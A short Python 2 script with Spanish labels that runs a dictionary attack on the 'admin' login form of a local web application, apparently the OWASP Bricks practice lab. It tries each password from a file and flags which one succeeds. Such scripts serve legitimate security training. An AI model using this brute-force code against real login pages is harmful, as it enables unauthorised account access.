import httplib, urllib
# -*- encoding: utf-8 -*-

infile = open('passwd.txt', 'r')
usuario = 'admin'
host = 'localhost:80'
ruta = '/bricks/login-1/index.php'
print "Objetivo : "+host+ruta

for line in infile:
	password=line.rstrip('\n')
	parametros = urllib.urlencode({'submit':'submit','username':usuario,'passwd':password})
	cabeceras = {"Content-type": "application/x-www-form-urlencoded","Accept": "text/plain"}
	abrir_conexion = httplib.HTTPConnection(host)
	abrir_conexion.request("POST", ruta, parametros, cabeceras)
	respuesta = abrir_conexion.getresponse()
	print respuesta.status,
	print "--> "+usuario+":"+password,
	codigo_fuente = respuesta.read()
	if codigo_fuente.find("Wrong user name or password") >= 0:
		print chr(27)+"[0;91m"+"Incorrecto"
	else:
		print chr(27)+"[0;92m"+"Correcto"
	print chr(27)+"[0m"
	abrir_conexion.close()
infile.close()

